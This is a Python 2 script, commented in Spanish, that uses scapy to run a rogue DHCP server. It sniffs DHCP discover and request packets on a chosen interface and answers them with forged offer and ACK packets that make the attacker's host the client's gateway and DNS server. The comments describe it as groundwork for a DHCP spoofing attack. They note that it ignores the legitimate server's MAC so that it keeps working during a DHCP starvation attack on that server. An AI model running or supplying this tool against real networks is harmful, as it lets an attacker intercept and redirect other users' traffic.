#/usr/bin/env python
#-*-coding: utf-8 -*-
# Autor: @kr1shn4murt1 basado en: http://projects2009developer.files.wordpress.com/2009/03/scapy.pdf
# Referencias: http://tools.ietf.org/html/rfc2131 , http://tools.ietf.org/html/rfc2132
# Fecha: Septiembre 11 - 2013
# Dependencias: Ejecutarse con python 2.6.x o 2.7.x , tener scapy instalado en la maquina desde donde se ejecuta
# Este script actua como un servidor DHCP escuchando peticiones por la interfaz de red escogida, entrega la informacion relevante de direccionamiento ip
# a un cliente que la solicite, a mejorar esta el designar un rango de ips a entregar por ahora solo entrega 1 y agregar multihilo, luego de eso agregar
# otras funciones que sean las que ejecuten el ataque de dhcp spoofing
# Modificar el script para que funcione en redes inalambricas


#Se importan las librerias de scapy
from scapy.all import *

#Se definen las variuables con los datos de la red
ip_Servidor="172.16.185.128"
ip_cliente="172.16.185.12"
mac_Servidor="00:50:56:34:56:ad"
mascara_Subred="255.255.255.0"
puerta_Enlace='172.16.185.128'
interfaz_A_Sniffear='eth6'
# Se define la mac del servidor real con el fin de ignorar los paquetes que van hacia el y evitar que nuestro script
# colapse con el mismo ataque de dhcp starvation lanzado contra el servidor real
#ip_Servidor_Atacado= '172.16.185.5'
mac_Servidor_Atacado= '00:50:56:3f:84:24'

# Se define una funcion que empieza a sniffear por la interfaz de red designada, se esniffean solo paquetes en los puertos 67 y 68 que son los que usa el servicio DHCP
def encontrar_Peticiones_Dchp():
	# De encontrar un paquetes que se este usando en ese puerto se procede a llamar otra funcion que es la que procesara los paquetes de acuerdo a su informacion
	sniff(filter='port 67 or port 68', prn=procesar_Peticiones_Dhcp, iface=interfaz_A_Sniffear)

# Esta funcion es la que procesa los paquetes teniendo en cuenta si son de tipo discover o request y de acuerdo a esto se crea y se envia un paquete como respuesta
# a dichas solicitudes
def procesar_Peticiones_Dhcp(paquete):
	# Se verifica que el paquete tenga la capa DHCP
	
	if paquete[Ether].dst != mac_Servidor_Atacado:

		if paquete[DHCP]:
			#Se verifica si es un paquete tipo request DHCP message-type = discover (1)
			# para luego responder con un paquete tipo offer

			if paquete[DHCP].options[0][1]== 1:
				print '\tDetectado paquete DHCP tipo discover, se creara y enviara un paquete DHCP Offer como respuesta'
				
				print 'mac del cliente:', paquete[Ether].src
				
				# Se crea el paquete DHCP Offer con la informacion requerida, el campo xid de la capa bootp se toma del paquete que lo solicita, ya que el paquete 
				#respuesta debe tener el mismo numero
				capa_3_Ethernet=Ether(src=mac_Servidor,dst=paquete[Ether].src)
				capa_4_Ip=IP(src=ip_Servidor,dst=ip_cliente)
				capa_5_UDP=UDP(sport=67,dport=68)
				capa_6_BOOTP=BOOTP(op=2,yiaddr=ip_cliente,siaddr=ip_Servidor,giaddr='192.168.196.128',xid=paquete[BOOTP].xid, chaddr= paquete[BOOTP].chaddr)
				capa_7_DHCP=DHCP(options=[('message-type','offer'),('subnet_mask','255.255.255.0'),('server_id',ip_Servidor),('lease_time',1800),('domain','localdomain'),('name_server',ip_Servidor),('end')])

				# Se apilan las capas antes creadas con el separador '/' para crear el paquete DHCP tipo offer
				paquete_Offer=capa_3_Ethernet/capa_4_Ip/capa_5_UDP/capa_6_BOOTP/capa_7_DHCP

				# Se envia el paquete al cliente que lo solicito
				sendp(paquete_Offer)
				print 'Paquete DHCP Offer enviado: ',paquete_Offer.summary()
			#Se verifica si es un paquete tipo request DHCP message-type = request (3)
			# para luego responder con un paquete tipo ACK
			if paquete[DHCP].options[0][1]== 3:
				print '\tDetectado paquete DHCP tipo request, se creara y enviara un paquete DHCP ack como respuesta'
				print 'mac del cliente:', paquete[Ether].src

				# Se crea el paquete ack, tiene los mismos datos que el paquete anterior solo que en la capa DHCP el campo message-type cambia el valor de offer por ack
				paquete_ACK=Ether(src=mac_Servidor,dst=paquete[Ether].src)/IP(src=ip_Servidor,dst=ip_cliente)/UDP(sport=67,dport=68)/BOOTP(op=2,yiaddr=ip_cliente,siaddr=ip_Servidor,giaddr='192.168.196.128',xid=paquete[BOOTP].xid,chaddr= paquete[BOOTP].chaddr)/DHCP(options=[('message-type','ack'),('subnet_mask','255.255.255.0'),('server_id',ip_Servidor),('lease_time',1800),('domain','localdomain'),('name_server',ip_Servidor),('end')])
				sendp(paquete_ACK)
				print 'Paquete DHCP ACK enviado: ',paquete_ACK.summary()
		
		print 'procesado', paquete.summary()

# Se llama a la funcion de sniffeo principal para iniciar la ejecucion del script
encontrar_Peticiones_Dchp()